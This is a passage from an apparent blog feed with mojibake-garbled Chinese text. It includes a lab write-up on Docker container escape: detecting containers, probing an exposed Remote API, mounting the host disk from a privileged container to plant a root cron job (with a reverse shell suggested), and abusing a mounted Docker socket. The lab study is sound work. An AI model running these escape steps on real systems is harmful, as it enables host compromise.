ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯viewsetsè€Œä¸æ˜¯viewsï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ç®€å•åœ°ä½¿ç”¨è·¯ç”±å™¨ç±»æ³¨å†Œè§†å›¾æ¥è‡ªåŠ¨ç”ŸæˆAPIçš„URL confã€‚</p><p>å†æ¬¡ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å¯¹API URLè¿›è¡Œæ›´å¤šçš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°å°†å…¶æ‹‰å‡ºæ¥ä½¿ç”¨å¸¸è§„åŸºäºç±»çš„è§†å›¾ï¼Œå¹¶æ˜ç¡®åœ°ç¼–å†™URL confã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬å°†åŒ…æ‹¬ç”¨äºæ”¯æŒæµè§ˆå™¨æµè§ˆçš„APIçš„é»˜è®¤ç™»å½•å’Œæ³¨é”€è§†å›¾ã€‚è¿™æ˜¯å¯é€‰çš„ï¼Œä½†å¦‚æœæ‚¨çš„APIéœ€è¦èº«ä»½éªŒè¯ï¼Œå¹¶ä¸”ä½ æƒ³è¦ä½¿ç”¨æ”¯æŒæµè§ˆå™¨æµè§ˆçš„APIï¼Œé‚£ä¹ˆå®ƒä»¬å¾ˆæœ‰ç”¨ã€‚</p><h5 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h5><p>æ³¨å†Œæˆ‘ä»¬çš„åº”ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&#x27;rest_framework&#x27;</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="å›æ˜¾"><a href="#å›æ˜¾" class="headerlink" title="å›æ˜¾"></a>å›æ˜¾</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240322010341837.png" alt="image-20240322010341837" style="zoom: 50%;" /><hr><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>è°ƒç”¨ API</p><ul><li>åº”ç”¨è®¤è¯ - ç”¨æˆ·è®¤è¯ - ç”³è¯·è®¿é—®ç»„ä»¶ API çš„æƒé™ - è°ƒç”¨ç»„ä»¶ API</li><li>å‰é¢éƒ½ä¸ç”¨ç®¡ï¼Œç›´æ¥çœ‹è°ƒç”¨éƒ¨åˆ†</li><li>ä½¿ç”¨ç»„ä»¶SDKï¼š<code>pip install bkapi-component-open</code>ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†™è¿›<code>requirements.txt</code></li></ul><p>ç”Ÿæˆ API</p><ul><li>åœ¨ view ä¸­ç¼–å†™æ¥å£é¡µé¢</li><li>å¹¶æ­£ç¡®é…ç½®è·¯ç”±</li><li>é…ç½®ç”¨æˆ·ç»„å’Œæ˜ å°„</li><li>å‰ç«¯è°ƒç”¨å°è£…çš„ api è·å–æ•°æ®æ¸²æŸ“</li></ul>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerå®¹å™¨é€ƒé€¸</title>
      <link href="/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/02/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>äº‘åŸç”Ÿæ¦‚å¿µï¼šäº‘åŸç”Ÿçš„ä»£è¡¨æŠ€æœ¯åŒ…æ‹¬å®¹å™¨ã€æœåŠ¡ç½‘æ ¼ã€å¾®æœåŠ¡ã€ä¸å¯å˜åŸºç¡€è®¾æ–½å’Œå£°æ˜å¼APIã€‚</p><p>è€Œäº‘åŸç”Ÿå®‰å…¨ä¹Ÿå°±æ˜¯å›´ç»•ä¸Šè¿°å‡ ç±»æŠ€æœ¯å’Œè¡ç”ŸæŠ€æœ¯è¿›è¡Œæ¥¼å“¦å¯¹é‚£ä¸ªæŒ–æ˜å’Œåˆ©ç”¨ã€‚æ”»å‡»è·¯å¾„å‚è€ƒ CIS20220 ä¸Šæ€»ç»“çš„æ”»å‡»æ¨¡å‹ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143648473.png" alt="image-20240302143648473" style="zoom: 33%;" /><h1 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h1><p>åŸºäºä»¥ä¸Šçš„äº‘åŸç”Ÿä»¥åŠäº‘åŸç”Ÿå®‰å…¨ï¼Œæ€»ç»“å‡ºä»¥ä¸‹å¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼š</p><ul><li>ä¼ ç»Ÿå®‰å…¨é—®é¢˜ä¾ç„¶å­˜åœ¨<ul><li>ä¼ ç»Ÿwebå…¥ä¾µã€DDOSæ”»å‡»ç­‰ä¾ç„¶å­˜åœ¨ï¼Œç”šè‡³ä¼šå› ä¸ºäº‘ä¸Šæ¶æ„å¤æ‚ï¼Œç»„ä»¶ç›´æ¥çš„è°ƒç”¨å¢å¤šé€ æˆæ›´å¤šå®‰å…¨é—®é¢˜ï¼›</li></ul></li><li>API å®‰å…¨<ul><li>äº‘åŸç”Ÿæ¶æ„ä¸­ï¼Œå†…éƒ¨ç»„ä»¶å’Œå¾®æœåŠ¡çš„è°ƒç”¨æ™®éä½¿ç”¨APIï¼Œç”±æ­¤å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¹Ÿé€æ¸å¢å¤š</li></ul></li><li>å®¹å™¨å®‰å…¨<ul><li>å®¹å™¨é•œåƒå®‰å…¨ï¼Œå¦‚å®¹å™¨é€ƒé€¸ç­‰ï¼Œå¯ä»¥ç›´æ¥ä»å®¹å™¨è·³åˆ°å®¿ä¸»æœº</li></ul></li><li>Â·Â·Â·</li></ul><h1 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æœ¬è´¨ä¸Šå®¹å™¨å†…çš„è¿›ç¨‹åªæ˜¯ä¸€ä¸ªå—é™çš„æ™®é€šLinuxè¿›ç¨‹ï¼Œå®¹å™¨å†…éƒ¨è¿›ç¨‹çš„æ‰€æœ‰è¡Œä¸ºå¯¹äºå®¿ä¸»æœºæ¥è¯´æ˜¯é€æ˜çš„ã€‚æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨å®¿ä¸»æœºä»¥å“¦é‚£ä¸ªpsçœ‹åˆ°å®¹å™¨çš„è¿›ç¨‹ä¿¡æ¯ã€‚</p><p>æ‰€ä»¥ï¼Œå®¹å™¨é€ƒé€¸å’Œç¡¬ä»¶è™šæ‹ŸåŒ–é€ƒé€¸çš„æœ¬è´¨æœ‰å¾ˆå¤§çš„ä¸åŒ(ä¸åŒ…å« Kata Containers ç­‰ )ï¼Œå®¹å™¨é€ƒé€¸çš„è¿‡ç¨‹æ›´åƒä¸€ä¸ªå—é™è¿›ç¨‹è·å–æœªå—é™çš„å®Œæ•´æƒé™ï¼Œåˆæˆ–æŸä¸ªåŸæœ¬å— Cgroup&#x2F;Namespace é™åˆ¶æƒé™çš„è¿›ç¨‹è·å–æ›´å¤šæƒé™çš„æ“ä½œï¼Œæ›´è¶‹è¿‘äºææƒã€‚</p><p>è€Œè¯¥æ¼æ´åˆ©ç”¨æ€è·¯æ˜¯ï¼š</p><ul><li>æ£€æµ‹æ˜¯å¦å¤„äºå®¹å™¨ç¯å¢ƒ</li><li>è¿›è¡Œå®¹å™¨é€ƒé€¸<ul><li>åŸºäºAPI æ¼æ´</li><li>åŸºäºå±é™©é…ç½®</li><li>åŸºäºå±é™©æŒ‚è½½</li><li>åŸºäºç¨‹åºæ¼æ´</li><li>åŸºäºå†…æ ¸æ¼æ´</li></ul></li></ul><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="æ£€æµ‹å®¹å™¨ç¯å¢ƒ"><a href="#æ£€æµ‹å®¹å™¨ç¯å¢ƒ" class="headerlink" title="æ£€æµ‹å®¹å™¨ç¯å¢ƒ"></a>æ£€æµ‹å®¹å™¨ç¯å¢ƒ</h3><p>å‚è€ƒ Metasploit ä¸­æ£€æµ‹ container çš„æ¨¡å—(checkcontainerã€checkvm)ã€‚</p><ol><li>æ£€æŸ¥<code>/proc/1/cgroup</code>å†…æ˜¯å¦åŒ…å«<code>&quot;docker&quot;</code>æˆ–<code>&quot;kubepods&quot;</code>ç­‰å­—ç¬¦ä¸² ï¼ˆè™šæ‹Ÿæœºç¯å¢ƒä¸‹ä¹Ÿå­˜åœ¨ä¸€äº›ç‰¹å¾ï¼Œæ„Ÿè§‰æ˜¯ä¸»è¦æ£€æµ‹æ–¹æ³•ï¼‰</li><li>æ£€æŸ¥<code>/.dockerenv</code>æ–‡ä»¶æ˜¯å¦å­˜åœ¨ ï¼ˆè™šæ‹Ÿæœºç¯å¢ƒä¸‹æ—  <code>dockerenv </code>ï¼‰</li><li>æ£€æŸ¥ç¯å¢ƒå˜é‡ ï¼ˆk8s ç¯å¢ƒä¸‹æœ‰å¾ˆå¤šç‰¹å¾ç¯å¢ƒå˜é‡ï¼‰</li><li>æ£€æŸ¥ <code>mount</code> ä¿¡æ¯</li><li>æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯ ï¼ˆ<code>fdisk -l </code>å®¹å™¨è¾“å‡ºä¸ºç©ºï¼Œéå®¹å™¨æœ‰å†…å®¹è¾“å‡ºã€‚ï¼‰</li></ol><h5 id="docker-å®¹å™¨å¤ç°"><a href="#docker-å®¹å™¨å¤ç°" class="headerlink" title="docker å®¹å™¨å¤ç°"></a><strong>docker å®¹å™¨å¤ç°</strong></h5><p>â€‹æµ‹è¯•ç¯å¢ƒ ï¼š<code>docker nginx:latest</code> é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">~/docker<span class="comment"># docker run -it nginx /bin/bash</span></span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># ls -a</span></span><br><span class="line">.   .dockerenv  boot  docker-entrypoint.d   etc   lib    media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         dev   docker-entrypoint.sh  home  lib64  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># env</span></span><br><span class="line">HOSTNAME=a9252d978133</span><br><span class="line">PWD=/</span><br><span class="line">PKG_RELEASE=1~bookworm</span><br><span class="line">HOME=/root</span><br><span class="line">NJS_VERSION=0.8.3</span><br><span class="line">TERM=xterm</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">NGINX_VERSION=1.25.4</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># mount | grep &#x27;/ type&#x27;</span></span><br><span class="line">overlay on / <span class="built_in">type</span> overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/LPKZRVTP753VVXKM3ARZUK5OR2:/var/lib/docker/overlay2/l/AR7676WYAQNJS24WTSN5XA7V2I:/var/lib/docker/overlay2/l/DJKBU2ILQ2JIDHBVK4QMCXBSA7:/var/lib/docker/overlay2/l/JRSTI6UYS62A736CLJZFI6NNDO:/var/lib/docker/overlay2/l/6NPGO2PXGP3TVCVUCHWONBNIJF:/var/lib/docker/overlay2/l/BHLVJVJ5LD4VISES4VI6QFBGNN:/var/lib/docker/overlay2/l/XUYCWER26LYZCXFWJNF26X2HLC:/var/lib/docker/overlay2/l/KRKBYSDIT6JVAD7EUXOGIGYDXK,upperdir=/var/lib/docker/overlay2/ab464eeafa5120fc43e39033f5ee47577384378633d654b18009df07c55a81b3/diff,workdir=/var/lib/docker/overlay2/ab464eeafa5120fc43e39033f5ee47577384378633d654b18009df07c55a81b3/work)</span><br><span class="line"></span><br><span class="line">root@a9252d978133:/<span class="comment"># fdisk -l</span></span><br><span class="line">bash: fdisk: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œéƒ¨åˆ†æµ‹è¯•é€šè¿‡éƒ¨åˆ†æ²¡æœ‰ï¼Œä½†å¤§ä½“æ¥è®²èƒ½åˆ¤æ–­ç›®å‰å¤„äºä¸€ä¸ªdockerç¯å¢ƒã€‚</p><h3 id="åŸºäº-API-æ¼æ´çš„é€ƒé€¸"><a href="#åŸºäº-API-æ¼æ´çš„é€ƒé€¸" class="headerlink" title="åŸºäº API æ¼æ´çš„é€ƒé€¸"></a>åŸºäº API æ¼æ´çš„é€ƒé€¸</h3><h4 id="Docker-è¿œç¨‹API-æœªæˆæƒè®¿é—®é€ƒé€¸"><a href="#Docker-è¿œç¨‹API-æœªæˆæƒè®¿é—®é€ƒé€¸" class="headerlink" title="Docker è¿œç¨‹API æœªæˆæƒè®¿é—®é€ƒé€¸"></a><strong>Docker è¿œç¨‹API æœªæˆæƒè®¿é—®é€ƒé€¸</strong></h4><p>è¯¥æ¼æ´èµ·å› æ˜¯å› ä¸ºä½¿ç”¨Docker Swarmæ—¶ï¼Œç®¡ç†çš„docker èŠ‚ç‚¹ä¸Šä¾¿ä¼šå¼€æ”¾ä¸€ä¸ªTCPç«¯å£2375&#x2F;2376ï¼Œç»‘å®šåœ¨0.0.0.0ä¸Šï¼Œhttpè®¿é—®ä¼šè¿”å› 404 page not foundã€‚è¿™æ˜¯ Docker RemoteAPIï¼Œå¯ä»¥æ‰§è¡Œdockerå‘½ä»¤ï¼Œæ¯”å¦‚è®¿é—® <code>http://x.x.x.x:2375/containers/json</code> ä¼šè¿”å›æœåŠ¡å™¨å½“å‰è¿è¡Œçš„ container åˆ—è¡¨ï¼Œå’Œåœ¨ docker CLI ä¸Šæ‰§è¡Œ docker ps çš„æ•ˆæœä¸€æ ·ï¼Œå…¶ä»–æ“ä½œæ¯”å¦‚åˆ›å»º&#x2F;åˆ é™¤ containerï¼Œæ‹‰å– image ç­‰æ“ä½œä¹Ÿéƒ½å¯ä»¥é€šè¿‡APIè°ƒç”¨å®Œæˆã€‚</p><h5 id="docker-å®¹å™¨å¤ç°-1"><a href="#docker-å®¹å™¨å¤ç°-1" class="headerlink" title="docker å®¹å™¨å¤ç°"></a>docker å®¹å™¨å¤ç°</h5><ul><li>åœ¨é…ç½®Dockerå¯åŠ¨æ–‡ä»¶(<code>/usr/lib/systemd/system/docker.service)</code>æ—¶ï¼Œæ·»åŠ å…è®¸ä»»ä½•ç½‘æ®µè®¿é—®<code>Docker Remote API</code></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302143936032.png" alt="image-20240302143936032" style="zoom: 25%;" /><ul><li><p>é‡å¯ Dockerï¼š<code>sudo systemctl daemon-reload;sudo service docker restart</code></p></li><li><p>éªŒè¯å­˜åœ¨æ¼æ´</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@VM<span class="number">-8</span><span class="number">-4</span>-debian:/docker-test<span class="meta"># docker run --rm -ti ubuntu bash</span></span><br><span class="line">root@ff7d66f8c120:/# IP=`hostname -i | awk -F. <span class="string">&#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27;</span> ` &amp;&amp; timeout <span class="number">3</span> bash -c <span class="string">&quot;echo &gt;/dev/tcp/$IP/2375&quot;</span> &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;&amp; echo <span class="string">&quot;Docker Remote API Is Enabled.&quot;</span> || echo <span class="string">&quot;Docker Remote API is Closed.&quot;</span></span><br><span class="line">Docker Remote API Is Enabled.</span><br></pre></td></tr></table></figure><ul><li>åœ¨æœ¬åœ°åˆ©ç”¨è¯¥ API åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½é€ƒé€¸(åé¢æœ‰ç¤ºä¾‹)ï¼š<code>docker -H tcp://x.x.x.x:2375 run -it -v /docker-test:/test ubuntu /bin/bash</code></li></ul><h3 id="åŸºäºå±é™©é…ç½®çš„é€ƒé€¸"><a href="#åŸºäºå±é™©é…ç½®çš„é€ƒé€¸" class="headerlink" title="åŸºäºå±é™©é…ç½®çš„é€ƒé€¸"></a>åŸºäºå±é™©é…ç½®çš„é€ƒé€¸</h3><h4 id="privilegedç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨"><a href="#privilegedç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨" class="headerlink" title="privilegedç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨"></a><strong>privilegedç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨</strong></h4><p>æœ€åˆï¼Œå®¹å™¨ç‰¹æƒæ¨¡å¼çš„å‡ºç°æ˜¯ä¸ºäº†å¸®åŠ©å¼€å‘è€…å®ç°Docker-in-Dockerç‰¹æ€§ã€‚ç„¶è€Œï¼Œåœ¨ç‰¹æƒæ¨¡å¼ä¸‹è¿è¡Œä¸å®Œå…¨å—æ§å®¹å™¨å°†ç»™å®¿ä¸»æœºå¸¦æ¥æå¤§å®‰å…¨å¨èƒã€‚</p><blockquote><p>å½“æ“ä½œè€…æ‰§è¡Œ<code>docker run --privileged</code>æ—¶ï¼ŒDockerå°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼ŒåŒæ—¶ä¿®æ”¹AppArmoræˆ–SELinuxçš„é…ç½®ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚</p></blockquote><p>åœ¨è¿™æ ·çš„åœºæ™¯ä¸‹ï¼Œä»å®¹å™¨ä¸­é€ƒé€¸å‡ºå»æ—¶æ˜“å¦‚åæŒçš„ã€‚ä¾‹å¦‚ï¼šæ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ï¼Œç„¶åå°†æ ¹ç›®å½•åˆ‡æ¢è¿‡å»ã€‚</p><h5 id="docker-å®¹å™¨å¤ç°-2"><a href="#docker-å®¹å™¨å¤ç°-2" class="headerlink" title="docker å®¹å™¨å¤ç°"></a>docker å®¹å™¨å¤ç°</h5><ul><li>æ¼æ´éªŒè¯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@VM-8-4-debian:~<span class="comment"># docker exec -it 18a16c0e62f0  /bin/bash</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># cat /proc/self/status |grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 000001ffffffffff</span><br><span class="line">CapEff: 000001ffffffffff</span><br><span class="line">CapBnd: 000001ffffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° CapEff å¯¹åº”çš„æ©ç å€¼ä¸º <code>0000001fffffffff</code>   ï¼ˆpsï¼šæœå‡ºæ¥çš„blogå†™çš„æ˜¯<code>0000003fffffffff</code> ä¸è¿‡åé¢ä¹Ÿèƒ½æŒ‚è½½ï¼Œé—®é¢˜ä¸å¤§ã€‚ï¼‰</p><ul><li>è½¬ä¹‰</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@18a16c0e62f0:/<span class="comment"># capsh --decode=0000001fffffffff</span></span><br><span class="line">0x0000001fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend</span><br></pre></td></tr></table></figure><ul><li>æ¼æ´åˆ©ç”¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@18a16c0e62f0:/<span class="comment"># fdisk -l</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line">Device     Boot Start       End   Sectors Size Id Type</span><br><span class="line">/dev/vda1  *     2048 125829086 125827039  60G 83 Linux</span><br><span class="line"></span><br><span class="line">root@18a16c0e62f0:/<span class="comment">#mkdir /test</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment">#mount /dev/vda1 /test</span></span><br><span class="line"></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># touch /test/test.sh</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># echo &quot;111&quot; &gt; /test/test.sh</span></span><br><span class="line">root@18a16c0e62f0:/<span class="comment"># echo &quot;* * * * * root bash /test.sh&quot; &gt;&gt; /test/etc/crontab</span></span><br><span class="line"></span><br><span class="line">root@VM-8-4-debian:~<span class="comment"># cat /etc/crontab</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line">* * * * * root bash /test.sh                 </span><br><span class="line"> <span class="comment">#å¯ä»¥çœ‹åˆ°å·²ç»å†™è¿›å»äº†</span></span><br></pre></td></tr></table></figure><ul><li>å…¶ä¸­çš„ <code>test.sh</code> æˆ‘ä»¬å°±å¯ä»¥å†™åå¼¹ shell çš„å‘½ä»¤</li></ul><blockquote><p><strong>æ³¨æ„ï¼æ³¨æ„ï¼æ³¨æ„ï¼</strong></p><p>æ­¤æ—¶ <code>/test</code> å’Œå®¿ä¸»æœºçš„ <code>/</code> è¢«æŒ‚è½½åœ¨ä¸€èµ·ï¼Œåˆ é™¤<code>test</code>å°±ç›¸å½“äºåˆ é™¤ <code>/</code> ï¼ ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­</p></blockquote><h3 id="åŸºäºå±é™©æŒ‚è½½çš„é€ƒé€¸"><a href="#åŸºäºå±é™©æŒ‚è½½çš„é€ƒé€¸" class="headerlink" title="åŸºäºå±é™©æŒ‚è½½çš„é€ƒé€¸"></a>åŸºäºå±é™©æŒ‚è½½çš„é€ƒé€¸</h3><p>ä¸ºäº†æ–¹ä¾¿å®¿ä¸»æœºä¸è™šæ‹Ÿæœºè¿›è¡Œæ•°æ®äº¤æ¢ï¼Œå‡ ä¹æ‰€æœ‰ä¸»æµè™šæ‹Ÿæœºè§£å†³æ–¹æ¡ˆéƒ½ä¼šæä¾›æŒ‚è½½å®¿ä¸»æœºç›®å½•åˆ°è™šæ‹Ÿæœºçš„åŠŸèƒ½ã€‚å®¹å™¨åŒæ ·å¦‚æ­¤ã€‚ç„¶è€Œï¼Œå°†å®¿ä¸»æœºä¸Šçš„æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨â€”â€”å°¤å…¶æ˜¯é‚£äº›ä¸å®Œå…¨å—æ§çš„å®¹å™¨å†…éƒ¨å¾€å¾€ä¼šå¸¦æ¥å®‰å…¨é—®é¢˜ã€‚</p><h4 id="æŒ‚è½½-Docker-Socket-çš„æƒ…å†µ"><a href="#æŒ‚è½½-Docker-Socket-çš„æƒ…å†µ" class="headerlink" title="æŒ‚è½½ Docker Socket çš„æƒ…å†µ"></a><strong>æŒ‚è½½ Docker Socket çš„æƒ…å†µ</strong></h4><p>Docker Socket æ˜¯ Docker å®ˆæŠ¤è¿›ç¨‹ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œç”¨æ¥ä¸å®ˆæŠ¤è¿›ç¨‹é€šä¿¡â€”â€”æŸ¥è¯¢ä¿¡æ¯æˆ–ä¸‹å‘å‘½ä»¤ã€‚å¦‚æœåœ¨æ”»å‡»è€…å¯æ§çš„å®¹å™¨å†…æŒ‚è½½äº†è¯¥å¥—æ¥å­—æ–‡ä»¶ï¼ˆ&#x2F;var&#x2F;run&#x2F;docker.sockï¼‰ï¼Œå¯é€šè¿‡ Docker Socket ä¸ Docker å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ï¼Œå‘é€å‘½ä»¤åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°æ–°åˆ›å»ºçš„å®¹å™¨å†…éƒ¨ï¼Œå®Œæˆç®€å•é€ƒé€¸ã€‚</p><blockquote><p>é€šä¿—ä¸€ç‚¹ï¼šåœ¨å¯åŠ¨<code>docker</code>å®¹å™¨æ—¶ï¼Œå°†å®¿ä¸»æœº<code>/var/run/docker.sock</code>æ–‡ä»¶æŒ‚è½½åˆ°<code>docker</code>å®¹å™¨ä¸­ï¼Œåœ¨<code>docker</code>å®¹å™¨ä¸­ï¼Œä¹Ÿå¯ä»¥å†åˆ›å»ºä¸€ä¸ª <code>docker</code>ï¼Œå¹¶å°†è·Ÿï¼Œç›®å½•æŒ‚è½½åˆ°æ–°åˆ›å»ºçš„å®¹å™¨å†…ï¼Œå®ç°æŒ‚è½½é€ƒé€¸ã€‚</p></blockquote><h5 id="docker-å®¹å™¨å¤ç°-3"><a href="#docker-å®¹å™¨å¤ç°-3" class="headerlink" title="docker å®¹å™¨å¤ç°"></a>docker å®¹å™¨å¤ç°</h5><ul><li><p>ç¯å¢ƒæ­å»º</p><ul><li>å…ˆæ­å»ºdockerå¹¶æŒ‚è½½ï¼š<code>docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash</code></li></ul></li><li><p>æ¼æ´éªŒè¯</p><ul><li>å¦‚æœèƒ½å† docker ä¸­æ‰¾åˆ° sock æŒ‚è½½æ–‡ä»¶å°±è¯´æ˜æ¼æ´å­˜åœ¨(<code>find / -name *.sock</code> )</li></ul></li><li><p>æ¼æ´åˆ©ç”¨</p><ul><li>åœ¨å®¹å™¨ä¸­è£… <code>docker</code> ï¼š<code>apt-get update;apt-get install docker.io</code></li><li>åœ¨<code>docker</code>å®¹å™¨ä¸­ï¼Œä½¿ç”¨å‘½ä»¤æŸ¥çœ‹å®¿ä¸»æœºæ‹‰å–çš„é•œåƒ <code>docker -H unix://var/run/docker.sock images</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker -H unix://var/run/docker.sock images </span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">ubuntu        latest    3db8720ecbf5   2 weeks ago     77.9MB</span><br><span class="line">hello-world   latest    d2c94e258dcb   10 months ago   13.3kB</span><br><span class="line"><span 